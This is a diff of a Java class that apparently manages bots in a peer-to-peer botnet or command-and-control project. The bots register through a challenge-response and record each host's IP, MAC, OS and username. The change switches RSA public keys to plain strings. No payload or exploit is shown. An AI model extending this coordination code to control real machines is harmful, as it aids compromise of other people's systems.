@@ -98,7 +98,7 @@ public class Commando {
 		newKing = nServ.getMyIp().toString();
 
 		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(),
-				nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKey(),
+				nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(),
 				(nServ.isElegible() + ""));
 		bServ.save(bot);
 	}
@@ -194,15 +194,11 @@ public class Commando {
 				response = "Challenge OK";
 				objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
 				Bot bot;
-				try {
-					bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
-							objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
-							objects.get(6).toString(), pki.rebuildPuK(objects.get(8).toString()),
-							objects.get(9).toString());
-					bServ.save(bot);
-				} catch (NoSuchAlgorithmException | InvalidKeySpecException e) {
-					System.out.println("Non sono riuscito a salvare il bot causa ricostruzione chiave");
-				}
+				bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
+						objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
+						objects.get(6).toString(), objects.get(8).toString(),
+						objects.get(9).toString());
+				bServ.save(bot);
 			}
 		}
 		return response;
@@ -258,19 +254,14 @@ public class Commando {
 
 			IP s = graph.getEdgeSource(a[i]);
 			IP t = graph.getEdgeTarget(a[i]);
-			try {
-				if (!s.equals(new IP(bot.getIp()))) {
-					Bot sB = bServ.searchBotIP(s);
-					ipN.add(new Pairs<String, String>(sB.getIp(), pki.demolishPuK(sB.getPubKey())));
-				}
-				if (!t.equals(new IP(bot.getIp()))) {
-					Bot tB = bServ.searchBotIP(t);
-					ipN.add(new Pairs<String, String>(tB.getIp(), pki.demolishPuK(tB.getPubKey())));
-				}
-			} catch (InvalidKeySpecException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}	//	OutputStream ostream=  
+			if (!s.equals(new IP(bot.getIp()))) {
+				Bot sB = bServ.searchBotIP(s);
+				ipN.add(new Pairs<String, String>(sB.getIp(),(sB.getPubKey())));
+			}
+			if (!t.equals(new IP(bot.getIp()))) {
+				Bot tB = bServ.searchBotIP(t);
+				ipN.add(new Pairs<String, String>(tB.getIp(), tB.getPubKey()));
+			}
 
 		}	ByteArrayOutputStream ostream = new ByteArrayOutputStream();
 		try {
